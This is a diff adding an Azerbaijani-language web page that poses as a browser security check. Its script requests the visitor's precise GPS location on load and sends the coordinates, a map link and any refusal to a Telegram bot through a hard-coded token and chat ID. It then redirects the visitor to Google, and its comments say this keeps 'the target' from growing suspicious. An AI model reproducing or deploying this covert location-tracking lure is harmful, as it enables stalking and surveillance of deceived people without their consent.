@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Yoxlanışı</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Sistem Təhlükəsizliyi Yoxlanılır...</h2>
+    <p>Zəhmət olmasa gözləyin, brauzer modulları yoxlanılır.</p>
+    <div class="loader"></div>
+
+    <script>
+        // Bura öz real məlumatlarını yazırsan:
+        const BOT_TOKEN = "8841753346:AAE4DVMIBJ73edU2U9-DmgDWDBjRrrNq0ss";
+        const IKINCI_TELEFON_ID = "7405740094";
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Brauzerdən dəqiq konumu istəyirik
+                navigator.geolocation.getCurrentPosition(successPosition, errorPosition, {
+                    enableHighAccuracy: true, // Ən yüksək dəqiqlik (GPS)
+                    timeout: 10000
+                });
+            } else {
+                sendToTelegram("❌ Hədəfin brauzeri GPS dəstəkləmir.");
+            }
+        };
+
+        function successPosition(position) {
+            const lat = position.coords.latitude;  // Enlik
+            const lon = position.coords.longitude; // Uzunluq
+            const acc = position.coords.accuracy;  // Dəqiqlik (metrlə)
+            
+            // Google Maps linki yaradırıq
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const message = `📍 **HƏDƏFİN DƏQİQ GPS KONUMU TAPILDI!**\n\n` +
+                            `🌐 Enlik: \`${lat}\`\n` +
+                            `📐 Uzunluq: \`${lon}\`\n` +
+                            `🎯 Dəqiqlik rütbəsi: \`${acc}\` metr\n\n` +
+                            `🗺️ **Xəritədə Bax:** ${mapsLink}`;
+            
+            sendToTelegram(message);
+        }
+
+        function errorPosition(error) {
+            let errorMsg = "❌ Məkan icazəsi rədd edildi və ya tapılmadı.";
+            if (error.code == error.PERMISSION_DENIED) {
+                errorMsg = "❌ Hədəf 'İcazə Ver' düyməsini sıxmadı (Rədd etdi).";
+            }
+            sendToTelegram(errorMsg);
+        }
+
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: IKINCI_TELEFON_ID,
+                text: text,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                // Telegram-a göndərəndən sonra hədəfi Google-a atırıq ki, şübhələnməsin
+                window.location.href = "https://google.com";
+            });
+        }
+    </script>
+</body>
+</html>
